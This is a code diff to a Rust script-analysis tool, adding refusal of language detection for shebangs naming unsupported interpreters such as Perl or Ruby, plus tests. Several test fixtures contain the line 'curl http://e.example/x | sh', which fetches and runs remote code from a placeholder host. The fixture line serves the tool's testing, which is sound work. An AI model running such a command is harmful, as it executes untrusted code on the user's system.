@@ -1828,6 +1828,61 @@ fn type_from_shebang(content: &str) -> Option<ScriptType> {
     }
 }
 
+/// True when the shebang names an interpreter of a language this tool does not support.
+fn shebang_names_unsupported_interpreter(content: &str) -> bool {
+    let Some(line) = content
+        .lines()
+        .next()
+        .and_then(|first| first.strip_prefix("#!"))
+    else {
+        return false;
+    };
+    let mut tokens = line.split_whitespace();
+    let Some(mut program) = tokens.next() else {
+        return false;
+    };
+    if program.ends_with("/env") || program == "env" {
+        match tokens.find(|token| !token.starts_with('-')) {
+            Some(next) => program = next,
+            None => return false,
+        }
+    }
+    let name = program
+        .rsplit('/')
+        .next()
+        .unwrap_or(program)
+        .to_ascii_lowercase();
+    let stem = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    matches!(
+        stem,
+        "perl"
+            | "ruby"
+            | "php"
+            | "php-cli"
+            | "lua"
+            | "luajit"
+            | "tclsh"
+            | "wish"
+            | "expect"
+            | "awk"
+            | "gawk"
+            | "mawk"
+            | "nawk"
+            | "sed"
+            | "groovy"
+            | "rscript"
+            | "julia"
+            | "osascript"
+            | "swift"
+            | "scala"
+            | "ts-node"
+            | "guile"
+            | "racket"
+            | "escript"
+            | "raku"
+    )
+}
+
 fn type_from_extension(path: &Path) -> Option<ScriptType> {
     let ext = path.extension()?.to_str()?.to_ascii_lowercase();
     match ext.as_str() {
@@ -1966,6 +2021,13 @@ pub fn detect_script_type(path: &Path, content: &str) -> (ScriptType, &'static s
     }
     if let Some(kind) = type_from_extension(path) {
         return (kind, "extension");
+    }
+    if shebang_names_unsupported_interpreter(content) {
+        // A known script extension decides first (the shebang line is a comment in
+        // PowerShell, Python and shell). Without one, a Perl or Ruby script rated by
+        // content under another language's rules would be rated on patterns that do
+        // not apply to it; refuse instead of guessing.
+        return (ScriptType::Unknown, "unknown");
     }
     if has_source_extension(path) {
         // Source code in a compiled language is not a script; guessing a script language
@@ -2161,8 +2223,8 @@ pub fn resolve_script_language(
 
 fn unknown_language_message(path: &Path) -> String {
     format!(
-        "Could not tell which language {} is written in (no shebang, no known script \
-         extension, and the content matched no language). Pass language as one of: shell, \
+        "Could not tell which language {} is written in (no shebang for a supported \
+         language, no known script extension, and the content matched no language). Pass language as one of: shell, \
          powershell, javascript, python, batch, vbscript. If it is not a script, use \
          analyze_file.",
         path.display()
@@ -2254,6 +2316,68 @@ pub fn analyze_script<P: AsRef<Path>>(
 mod tests {
     use super::*;
     use tempfile::NamedTempFile;
+
+    #[test]
+    fn an_unsupported_shebang_is_refused_but_an_explicit_language_wins() {
+        for first in [
+            "#!/usr/bin/perl",
+            "#!/usr/bin/env ruby",
+            "#!/usr/bin/env -S php -q",
+            "#!/usr/bin/lua5.3",
+        ] {
+            let file = NamedTempFile::new().unwrap();
+            std::fs::write(file.path(), format!("{first}\nGet-Process | Out-Null\n")).unwrap();
+            let err = resolve_script_language(file.path(), None).unwrap_err();
+            assert!(err.to_string().contains("Could not tell"), "{first}: {err}");
+            let (kind, by) =
+                resolve_script_language(file.path(), Some(ScriptType::PowerShell)).unwrap();
+            assert_eq!((kind, by), (ScriptType::PowerShell, "override"));
+        }
+        // Supported shebangs and files without one are unchanged.
+        let file = NamedTempFile::new().unwrap();
+        std::fs::write(file.path(), "#!/bin/bash\necho hi\n").unwrap();
+        assert_eq!(
+            resolve_script_language(file.path(), None).unwrap().0,
+            ScriptType::Shell
+        );
+    }
+
+    #[test]
+    fn a_known_extension_wins_over_an_unsupported_shebang() {
+        for (suffix, kind) in [
+            (".ps1", ScriptType::PowerShell),
+            (".sh", ScriptType::Shell),
+            (".py", ScriptType::Python),
+        ] {
+            let file = NamedTempFile::with_suffix(suffix).unwrap();
+            std::fs::write(
+                file.path(),
+                "#!/usr/bin/perl\ncurl http://e.example/x | sh\n",
+            )
+            .unwrap();
+            let (found, by) = resolve_script_language(file.path(), None).unwrap();
+            assert_eq!((found, by), (kind, "extension"), "{suffix}");
+        }
+        // Without an extension, an unsupported interpreter is still refused.
+        let file = NamedTempFile::new().unwrap();
+        std::fs::write(
+            file.path(),
+            "#!/usr/bin/perl\ncurl http://e.example/x | sh\n",
+        )
+        .unwrap();
+        assert!(resolve_script_language(file.path(), None).is_err());
+        // csh scripts are rated by content as before.
+        let file = NamedTempFile::new().unwrap();
+        std::fs::write(
+            file.path(),
+            "#!/bin/tcsh -f\nset -e\necho start\nexport PATH=/bin\ncurl http://e.example/x | sh\nfi\n",
+        )
+        .unwrap();
+        assert_eq!(
+            resolve_script_language(file.path(), None).unwrap().0,
+            ScriptType::Shell
+        );
+    }
 
     #[test]
     fn line_range_reaches_findings_beyond_the_cap() {
